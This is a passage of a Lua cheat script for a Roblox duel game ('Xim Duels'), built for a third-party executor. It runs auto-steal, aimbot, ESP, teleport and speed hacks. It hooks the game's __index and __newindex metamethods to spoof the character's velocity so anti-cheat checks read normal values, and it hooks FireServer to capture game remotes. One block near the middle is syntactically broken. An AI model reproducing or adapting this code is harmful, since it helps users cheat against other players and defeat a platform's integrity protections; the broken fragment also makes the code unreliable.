    M.stopAutoSteal()
    M.stopBatAimbot()
    M.stopAutoLeft()
    M.stopAutoRight()
    M.stopAntiRagdoll()
    M.stopHoldInfJump()
    M.stopManualInfJumpLoop()
    M.stopMedusaCounter()
    M.stopBatCounter()
    M.stopUnwalk()
    M.antiLagEnabled = true; pcall(function() M.enableAntiLag() end)
    M.disableStretchRez()
    M.stopAutoTP()
    M.disableAntiKick()
    M.stopBypassAimbot()
    M.stopRemoveAcc()
    M.toggleESP(false)
    M.togglePlayerSpeeds(false)
    M.autoResetOnDeath = false
    setupDeathReset()

    saveCherryConfig()
    M.buildGui()
end

-- ============================================================
-- INITIALIZATION
-- ============================================================
repeat task.wait() until game:IsLoaded()
task.wait(0.5)
loadCherryConfig()
M.stealBarSize = 300
M.uiScale = 0.48
M.uiScale = math.clamp(tonumber(M.uiScale) or 0.48, 0.35, 1.2)
M.antiKickEnabled = false
M.antiSummerBaseEnabled = false
pcall(function() if M.disableAntiKick then M.disableAntiKick() end end)
pcall(function() if M.disableAntiSummerBase then M.disableAntiSummerBase() end end)
if M._savedTheme and CHERRY_THEMES[M._savedTheme] then
    CherryConfig.Theme = M._savedTheme
    M.colorScheme = M._savedTheme
elseif M.colorScheme and CHERRY_THEMES[M.colorScheme] then
    CherryConfig.Theme = M.colorScheme
    M._savedTheme = M.colorScheme
end
applyAccentFromTheme()
pcall(saveCherryConfig)
M.buildGui() -- applies M.menuOpen (closed stays closed)
pcall(function()
    if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
    if M.updateHeadTheme then M.updateHeadTheme() end
    if M.mainFrame then M.recolorBlacksToTheme(M.mainFrame) end
    -- keep auto steal pure black
end)
if M.mobileButtonsEnabled then M.buildMobileButtons() end
if M.antiRagdollEnabled then M.startAntiRagdoll() end
    if M.hardHitEnabled then M.startHardHit() end
    if M.setHardHitVisual then M.setHardHitVisual(M.hardHitEnabled) end
if M.infJumpEnabled then
    if M.infJumpMode=="manual" then M.startManualInfJumpLoop()
    elseif M.infJumpMode=="hold" then M.startHoldInfJump() end
end
if M.medusaCounterEnabled then M.setupMedusa(player.Character) end
if M.batCounterEnabled then M.startBatCounter() end
-- Unwalk / anim pack / normal (from config; both off = original walk, never force unwalk)
do
    local ALLOWED = { Vampire = true, ["Amazon Unboxed"] = true, Bubbly = true, Tryhard = true }
    if M.animPackEnabled and type(M.animPack) == "string" and ALLOWED[M.animPack] then
        M.unwalkEnabled = false
    elseif M.unwalkEnabled == true then
        M.animPackEnabled = false
        M.animPack = nil
    else
        M.animPackEnabled = false
        M.animPack = nil
        M.unwalkEnabled = false
    end
    task.defer(function()
        pcall(function() M.applyWalkState(player.Character) end)
    end)
end
if M.setUnwalkVisual then pcall(function() M.setUnwalkVisual(M.unwalkEnabled == true) end) end
if M.autoTPEnabled then M.startAutoTP() end
if M.autoBatEnabled then M.queueAutoBatStart() end
if M.autoLeftEnabled then M.startAutoLeft() end
if M.autoRightEnabled then M.startAutoRight() end
if M.Steal.AutoStealEnabled then M.startAutoSteal() end
if M.bypassAimbotEnabled then M.startBypassAimbot() end
if M.antiDieEnabled then pcall(M.startAntiDie) end
-- anti-kick removed
M.antiKickEnabled = false
M.antiLagEnabled = true
pcall(function() M.enableAntiLag() end)
if M.nukeOptEnabled then pcall(function() M.enableNukeOptimizer() end) end
if M.fpsBoostEnabled then pcall(function() M.applyFPSBoost() end) end
M.antiSummerBaseEnabled = false -- removed feature
if M.stretchRezEnabled then M.enableStretchRez() end
if M.potatoGraphicsEnabled then pcall(function() M.enablePotatoGraphics() end) end
if M.removeAccEnabled then M.startRemoveAcc() end
-- autoResetOnDeath removed

if M.playerESPEnabled and M.toggleESP then
    task.defer(function() pcall(function() M.toggleESP(true) end) end)
end
-- Anim pack only if enabled; else base game
if M.animPackEnabled and M.animPack and M.PACKS[M.animPack] then
    task.wait(0.5)
    M.applyAnimPack(M.animPack)
else
    M.animPackEnabled = false
    M.animPack = nil
end

task.wait(0.3)
-- Always keep original avatar colors (no forced black/headless/korblox)
M.headlessEnabled = false
M.korbloxEnabled = false
M.vynxBlackSkinEnabled = false
-- Re-apply walk state after spawn ONLY if a toggle is ON (else original)
pcall(function() M.applyWalkState(player.Character) end)

M.CandyApplyCustomSky(M.currentSkyTheme)
if M.showPlayerSpeeds then M.togglePlayerSpeeds(true) end
M.playerESPEnabled = true
if M.toggleESP then pcall(function() M.toggleESP(true) end) end
M.cleanSkyEnabled = true
pcall(function() M.applyCleanSky(true) end)

M.updateStatusRadius()
M.startHeadSpeedUpdates()

if player.Character then
    M.setupHeadIndicator(player.Character)
    M.setupRagdollTriggers()
end
player.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    M.setupHeadIndicator(char)
    if M.hardHitEnabled then task.defer(function() M.hideHardHitRing(); M.showHardHitRing() end) end
    M.setupRagdollTriggers()
    if M.medusaCounterEnabled then M.setupMedusa(char) end
    if M.batCounterEnabled then M.startBatCounter() end
    task.wait(0.35)
    -- Walk state already handled by early CharacterAdded; only cosmetics here
    M.applyCharterToChar(char)
    task.delay(0.8, function()
        if player.Character == char then M.applyCharterToChar(char) end
    end)
    if M.bypassAimbotEnabled then
        task.wait(0.2)
        M.startBypassAimbot()
    end
end)

-- Lightweight no-collide (no GetDescendants every frame — avoids lag/ping spikes)
do
    local _ncAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        _ncAcc = _ncAcc + dt
        if _ncAcc < 0.35 then return end
        _ncAcc = 0
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player and p.Character then
                local hrp = p.Character:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CanCollide = false end
                local head = p.Character:FindFirstChild("Head")
                if head then head.CanCollide = false end
            end
        end
    end)
end

local function destroySpeedObjects()
    if M._anchoredBySpeed then pcall(function() M._anchoredBySpeed.Anchored = false end); M._anchoredBySpeed = nil end
    if M._bodyVel then pcall(function() M._bodyVel:Destroy() end); M._bodyVel = nil end
    if M._bodyPosition then pcall(function() M._bodyPosition:Destroy() end); M._bodyPosition = nil end
    if M._bodyForce then pcall(function() M._bodyForce:Destroy() end); M._bodyForce = nil end
    if M._bodyThrust then pcall(function() M._bodyThrust:Destroy() end); M._bodyThrust = nil end
    if M._linearVel then pcall(function() M._linearVel:Destroy() end); M._linearVel = nil end
    if M._vectorForce then pcall(function() M._vectorForce:Destroy() end); M._vectorForce = nil end
    if M._alignPos then pcall(function() M._alignPos:Destroy() end); M._alignPos = nil end
    if M._rocket then pcall(function() M._rocket:Destroy() end); M._rocket = nil end
    if M._rocketTarget then pcall(function() M._rocketTarget:Destroy() end); M._rocketTarget = nil end
    if M._attLinVel then pcall(function() M._attLinVel:Destroy() end); M._attLinVel = nil end
    if M._attVecForce then pcall(function() M._attVecForce:Destroy() end); M._attVecForce = nil end
    if M._attAlign then pcall(function() M._attAlign:Destroy() end); M._attAlign = nil end
    if M._speedTween then pcall(function() M._speedTween:Cancel() end); M._speedTween = nil end
end

local function ensureSpeedAttachment(hrp, key, name)
    local att = M[key]
    if not att or att.Parent ~= hrp then
        if att then pcall(function() att:Destroy() end) end
        att = Instance.new("Attachment")
        att.Name = name or "MoveeSpeedAtt"
        att.Parent = hrp
        M[key] = att
    end
    return att
end

local function applySpeedMethod(hrp, hum, dir, spd, dt)
    local step = dt or 1/60
    local m = M.speedMethod
    if M._lastSpeedMethod ~= m then
        destroySpeedObjects()
        if m ~= "WalkSpeed" and hum.WalkSpeed ~= 16 then hum.WalkSpeed = 16 end
        M._lastSpeedMethod = m
    end
    local char = hrp.Parent
    local targetPos = hrp.Position + (dir * spd * step)

    local function massImpulse(direction, targetSpeed)
        local mass = hrp.AssemblyMass or 1
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(direction.X * targetSpeed, current.Y, direction.Z * targetSpeed)
        local delta = desired - current
        pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end)
    end

    if m == "Velocity" then
        massImpulse(dir, spd)
    elseif m == "AssemblyLinearVelocity" then
        massImpulse(dir, spd)
    elseif m == "Velocity Lerp" then
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd)
        local blended = current:Lerp(desired, 0.6)
        local mass = hrp.AssemblyMass or 1
        pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end)
    elseif m == "AssemblyLinearVelocity Lerp" then
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd)
        local blended = current:Lerp(desired, 0.6)
        local mass = hrp.AssemblyMass or 1
        pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end)
    elseif m == "CFrame" then
        hrp.CFrame = hrp.CFrame + (dir * spd * step)
    elseif m == "CFrame Lerp" then
        hrp.CFrame = hrp.CFrame:Lerp(hrp.CFrame + (dir * spd * step), 0.5)
    elseif m == "Hyper CFrame" then
        hrp.CFrame = hrp.CFrame + (dir * spd * (M.hyperMult or 4) * step)
    elseif m == "Anchored CFrame" then
        if not hrp.Anchored then
            hrp.Anchored = true
            M._anchoredBySpeed = hrp
        end
        hrp.CFrame = hrp.CFrame + (dir * spd * step)
    elseif m == "PivotTo" then
        hrp:PivotTo(hrp.CFrame + (dir * spd * step))
    elseif m == "Model PivotTo" then
        if char and char:IsA("Model") then
            char:PivotTo(char:GetPivot() + (dir * spd * step))
        else
            hrp:PivotTo(hrp.CFrame + (dir * spd * step))
        end
    elseif m == "Tween CFrame" then
        if M._speedTween then pcall(function() M._speedTween:Cancel() end) end
        M._speedTween = TweenService:Create(hrp, TweenInfo.new(step, Enum.EasingStyle.Linear), {CFrame = hrp.CFrame + (dir * spd * step)})
        M._speedTween:Play()
    elseif m == "WalkSpeed" then
        hum.WalkSpeed = spd
    elseif m == "Humanoid Move" then
        hum.WalkSpeed = spd
        hum:Move(dir)
    elseif m == "Humanoid MoveTo" then
        hum:MoveTo(targetPos, hrp)
    elseif m == "BodyVelocity" then
        if not M._bodyVel or M._bodyVel.Parent ~= hrp then
            if M._bodyVel then pcall(function() M._bodyVel:Destroy() end) end
            M._bodyVel = Instance.new("BodyVelocity")
            M._bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyVel.Parent = hrp
        end
        M._bodyVel.Velocity = Vector3.new(dir.X*spd, M._bodyVel.Velocity.Y, dir.Z*spd)
    elseif m == "BodyPosition" then
        if not M._bodyPosition or M._bodyPosition.Parent ~= hrp then
            if M._bodyPosition then pcall(function() M._bodyPosition:Destroy() end) end
            M._bodyPosition = Instance.new("BodyPosition")
            M._bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyPosition.P = 500
            M._bodyPosition.D = 50
            M._bodyPosition.Parent = hrp
        end
        M._bodyPosition.Position = targetPos
    elseif m == "BodyForce" then
        if not M._bodyForce or M._bodyForce.Parent ~= hrp then
            if M._bodyForce then pcall(function() M._bodyForce:Destroy() end) end
            M._bodyForce = Instance.new("BodyForce")
            M._bodyForce.Parent = hrp
        end
        M._bodyForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "BodyThrust" then
        if not M._bodyThrust or M._bodyThrust.Parent ~= hrp then
            if M._bodyThrust then pcall(function() M._bodyThrust:Destroy() end) end
            M._bodyThrust = Instance.new("BodyThrust")
            M._bodyThrust.Force = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyThrust.Parent = hrp
        end
        M._bodyThrust.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "LinearVelocity" then
        if not M._linearVel or M._linearVel.Parent ~= hrp then
            if M._linearVel then pcall(function() M._linearVel:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attLinVel", "MoveeLinVelAtt")
            M._linearVel = Instance.new("LinearVelocity")
            M._linearVel.Attachment0 = att
            M._linearVel.MaxForce = 1e8
            M._linearVel.RelativeTo = Enum.ActuatorRelativeTo.World
            M._linearVel.Parent = hrp
        end
        M._linearVel.VectorVelocity = Vector3.new(dir.X*spd, M._linearVel.VectorVelocity.Y, dir.Z*spd)
    elseif m == "VectorForce" then
        if not M._vectorForce or M._vectorForce.Parent ~= hrp then
            if M._vectorForce then pcall(function() M._vectorForce:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attVecForce", "MoveeVecForceAtt")
            M._vectorForce = Instance.new("VectorForce")
            M._vectorForce.Attachment0 = att
            M._vectorForce.RelativeTo = Enum.ActuatorRelativeTo.World
            M._vectorForce.Parent = hrp
        end
        M._vectorForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "AlignPosition" then
        if not M._alignPos or M._alignPos.Parent ~= hrp then
            if M._alignPos then pcall(function() M._alignPos:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attAlign", "MoveeAlignAtt")
            M._alignPos = Instance.new("AlignPosition")
            M._alignPos.Attachment0 = att
            M._alignPos.Mode = Enum.PositionAlignmentMode.OneAttachment
            M._alignPos.MaxForce = math.huge
            M._alignPos.Responsiveness = 15
            M._alignPos.RigidityEnabled = false
            M._alignPos.Parent = hrp
        end
        M._alignPos.Position = targetPos
    elseif m == "ApplyImpulse" then
        local mass = hrp.AssemblyMass or 1
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X * spd, current.Y, dir.Z * spd)
        local delta = desired - current
        pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end)
    elseif m == "RocketPropulsion" then
        if not M._rocket or M._rocket.Parent ~= hrp or not M._rocketTarget then
            if M._rocket then pcall(function() M._rocket:Destroy() end) end
            if M._rocketTarget then pcall(function() M._rocketTarget:Destroy() end) end
            M._rocketTarget = Instance.new("Part")
            M._rocketTarget.Name = "MoveeRocketTarget"
            M._rocketTarget.Anchored = true
            M._rocketTarget.CanCollide = false
            M._rocketTarget.Transparency = 1
            M._rocketTarget.Size = Vector3.new(1,1,1)
            M._rocketTarget.Parent = workspace
            M._rocket = Instance.new("RocketPropulsion")
            M._rocket.MaxThrust = 3000
            M._rocket.MaxTorque = 1000
            M._rocket.ThrustP = 100
            M._rocket.ThrustD = 20
            M._rocket.TurnP = 100
            M._rocket.TurnD = 10
            M._rocket.Target = M._rocketTarget
            M._rocket.Parent = hrp
        end
        M._rocketTarget.Position = targetPos
        pcall(function() M._rocket:Fire() end)
    end
end

M._spoofedVelocity = Vector3.zero
M._speedHooksReady = false
local function speedShouldOff()
    return M.autoBatEnabled == true or M.autoLeftEnabled == true or M.autoRightEnabled == true
end
pcall(function()
    if M._speedHooksReady then return end
    if not hookmetamethod or not newcclosure or not checkcaller then return end
    local oldIndex
    oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
        if not checkcaller() and not speedShouldOff() and (key == "AssemblyLinearVelocity" or key == "Velocity") then
            if typeof(self) == "Instance" and self:IsA("BasePart") and self.Name == "HumanoidRootPart" and player.Character and self:IsDescendantOf(player.Character) then
                return M._spoofedVelocity
            end
        end
        return oldIndex(self, key)
    end))
    local oldNewIndex
    oldNewIndex = hookmetamethod(game, "__newindex", newcclosure(function(self, key, value)
        if not checkcaller() and not speedShouldOff() and (key == "AssemblyLinearVelocity" or key == "Velocity") then
            if typeof(self) == "Instance" and self:IsA("BasePart") and self.Name == "HumanoidRootPart" and player.Character and self:IsDescendantOf(player.Character) then
                M._spoofedVelocity = value
                return
            end
        end
        return oldNewIndex(self, key, value)
    end))
    M._speedHooksReady = true
end)

local function applyVelocitySpeed(speed)
    if speedShouldOff() then return end
    local char = player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not char or not hum or not root or hum.Health <= 0 then return end
    if M.isRagdollState and M.isRagdollState(hum) then
        M.lastMoveDir = Vector3.new(0,0,0)
        destroySpeedObjects()
        return
    end
    M.updateAutoSwitchSpeed()
    local dir = hum.MoveDirection
    if dir.Magnitude <= 0.05 and M.antiRagdollEnabled and M.lastMoveDir and M.lastMoveDir.Magnitude > 0 then
        local anyHeld = false
        for key in pairs(M.MOVE_KEYS) do if UIS:IsKeyDown(key) then anyHeld = true break end end
        if anyHeld then dir = M.lastMoveDir end
    end
    if dir.Magnitude > 0.05 then
        M.lastMoveDir = dir
        pcall(function()
            if root.SetNetworkOwner then root:SetNetworkOwner(player) end
        end)
        local unit = dir.Unit
        local y = root.AssemblyLinearVelocity.Y
        M._spoofedVelocity = Vector3.new(unit.X * 16, y, unit.Z * 16)
        root.AssemblyLinearVelocity = Vector3.new(unit.X * speed, y, unit.Z * speed)
    else
        local y = root.AssemblyLinearVelocity.Y
        M._spoofedVelocity = Vector3.new(0, y, 0)
        destroySpeedObjects()
    end
end

RunService.PreSimulation:Connect(function()
    applyVelocitySpeed(M.getActiveMoveSpeed())
end)

task.spawn(function()
        end)
    end
end)

pcall(function()
    if hookfunction and newcclosure then
        local oldFire
        oldFire=hookfunction(Instance.new("RemoteEvent").FireServer,newcclosure(function(self,...)
            if not M.cursedResetRemote and typeof(self)=="Instance" and self:IsA("RemoteEvent") and self.Name:sub(1,3)=="RE/" then M.cursedResetRemote=self end
            return oldFire(self,...)
        end))
    end
end)
task.spawn(function()
    task.wait(2); if M.cursedResetRemote then return end
    for _,desc in ipairs(game:GetDescendants()) do
        if desc:IsA("RemoteEvent") and desc.Name:sub(1,3)=="RE/" then M.cursedResetRemote=desc; break end
    end
end)

task.spawn(function()
    while task.wait(5) do saveCherryConfig() end
end)

M.applyFOV()
task.spawn(function()
    while true do
        task.wait(2)
        pcall(M.saveBtnPositions)
    end
end)

task.spawn(function()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then plots = workspace:WaitForChild("Plots",10) end
    if plots then
        for _,plot in ipairs(plots:GetChildren()) do
            if plot:IsA("Model") then scanPlotNormal(plot) end
        end
        plots.ChildAdded:Connect(function(plot)
            if plot:IsA("Model") then task.wait(0.5); scanPlotNormal(plot) end
        end)
        while true do
            task.wait(5)
            M.animalCache={}; M.promptCache={}; M.stealCache={}
            for _,plot in ipairs(plots:GetChildren()) do
                if plot:IsA("Model") then scanPlotNormal(plot) end
            end
        end
    end
end)

task.spawn(function()
    M.initSemiSync()
    while true do
        task.wait(5)
        if M.Semi.enabled or M.stealMode == "Semi" then
            pcall(M.scanAllPlotsSemi)
        end
    end
end)

function M.refreshSpeedModeLabel()
    -- not used
end

pcall(function()
    M.refreshWalkSpeedAutoSwitch()
    if M.customFontSelected and M.customFontSelected ~= "None" then
        task.spawn(function()
            task.wait(0.4)
            pcall(function() M.applyCustomFont(M.customFontSelected) end)
        end)
    end
end)

-- ============================================================
-- INTRO (red + black contours)
-- ============================================================
function M.playIntro()
    if M.introGUIEnabled == false and M.introSoundEnabled == false then
        return
    end
    -- Xim Duels intro
    pcall(function()
        local guiParent = player:FindFirstChild("PlayerGui") or game:GetService("CoreGui")
        for _, n in ipairs({"S2Intro", "CalciumIntro", "XimDuelsIntro", "XimIntro", "ShadowVSIntro", "XrayVsIntro"}) do
            pcall(function()
                local o = guiParent:FindFirstChild(n)
                if o then o:Destroy() end
            end)
            pcall(function()
                local o = game:GetService("CoreGui"):FindFirstChild(n)
                if o then o:Destroy() end
            end)
            pcall(function()
                if gethui then
                    local h = gethui()
                    local o = h and h:FindFirstChild(n)
                    if o then o:Destroy() end
                end
            end)
        end

        if M.introGUIEnabled == false then
            if M.introSoundEnabled ~= false then
                local s = Instance.new("Sound")
                s.SoundId = "rbxassetid://828172750"
                s.Volume = 1
                s.Parent = game:GetService("SoundService")
                pcall(function() s:Play() end)
                task.delay(3, function() pcall(function() s:Destroy() end) end)
            end
            return
        end

        local sg = Instance.new("ScreenGui")
        sg.Name = "XimIntro"
        sg.ResetOnSpawn = false
        sg.DisplayOrder = 9999
        sg.IgnoreGuiInset = true
        pcall(function() sg.Parent = game:GetService("CoreGui") end)
        if not sg.Parent then
            pcall(function() if gethui then sg.Parent = gethui() end end)
        end
        if not sg.Parent then
            sg.Parent = guiParent
        end

        local bg = Instance.new("Frame", sg)
        bg.Size = UDim2.new(1, 0, 1, 0)
        bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        bg.BackgroundTransparency = 0.2
        bg.BorderSizePixel = 0

        local t1 = Instance.new("TextLabel", bg)
        t1.Size = UDim2.new(1, 0, 0, 52)
        t1.Position = UDim2.new(0, 0, 0.4, 0)
        t1.BackgroundTransparency = 1
        t1.Text = "XIM DUELS"
        t1.TextColor3 = Color3.fromRGB(255, 255, 255)
        t1.Font = Enum.Font.GothamBlack
        t1.TextSize = 44
        t1.TextTransparency = 1
        t1.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        t1.TextStrokeTransparency = 0.3

        local t2 = Instance.new("TextLabel", bg)
        t2.Size = UDim2.new(1, 0, 0, 28)
        t2.Position = UDim2.new(0, 0, 0.4, 52)
        t2.BackgroundTransparency = 1
        t2.Text = "LOADED"
        t2.TextColor3 = Color3.fromRGB(200, 200, 200)
        t2.Font = Enum.Font.GothamBold
        t2.TextSize = 18
        t2.TextTransparency = 1
        t2.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        t2.TextStrokeTransparency = 0.4

        if M.introSoundEnabled ~= false then
            local introSound = Instance.new("Sound")
            introSound.SoundId = "rbxassetid://828172750"
            introSound.Volume = 1
            introSound.Parent = sg
            pcall(function() introSound:Play() end)
        end

        TweenService:Create(t1, TweenInfo.new(0.4), { TextTransparency = 0 }):Play()
        TweenService:Create(t2, TweenInfo.new(0.5), { TextTransparency = 0 }):Play()
        task.wait(1.5)
        TweenService:Create(t1, TweenInfo.new(0.3), { TextTransparency = 1 }):Play()
        TweenService:Create(t2, TweenInfo.new(0.3), { TextTransparency = 1 }):Play()
        TweenService:Create(bg, TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
        task.wait(0.4)
        sg:Destroy()
    end)
end


-- ============================================================

task.spawn(function() task.wait(0.35); pcall(M.playIntro) end)
pcall(function()
    if M.pingPanelOpen then
        if M.setPingPanelOpen then M.setPingPanelOpen(true)
        elseif M.buildPingLaggerUI then M.buildPingLaggerUI(); if M.pingMain then M.pingMain.Visible = true end end
    end
    if M.killLaggerOpen then
        if M.setKillLaggerPanelOpen then M.setKillLaggerPanelOpen(true)
        elseif M.buildKillLaggerUI then M.buildKillLaggerUI(); if M.killLaggerMain then M.killLaggerMain.Visible = true end end
    end
    -- Anti Anti Desync panel disabled
    M.aadPanelOpen = false
    pcall(function()
        if M.setAntiAntiDesync then M.setAntiAntiDesync(false) end
        if M.aadGui then M.aadGui:Destroy() end
        M.aadGui = nil; M.aadMain = nil
    end)
    if M.autoCarryEnemyBaseEnabled then M.startAutoCarryEnemyBase() end
end)
pcall(function() if M.topBannerGui then M.topBannerGui:Destroy() end; M.topBannerGui=nil end)
-- Keep enemies visible (fix optimizer/ESP glitches that hid them)
pcall(function()
    if M._enemyVisConn then M._enemyVisConn:Disconnect() end
    local acc = 0
    M._enemyVisConn = RunService.Heartbeat:Connect(function(dt)
        acc = acc + (dt or 0.016)
        if acc < 1.5 then return end
        acc = 0
        if M.ensureEnemyVisibility then pcall(M.ensureEnemyVisibility) end
    end)
end)
print("Xim Duels loaded successfully!")
return M
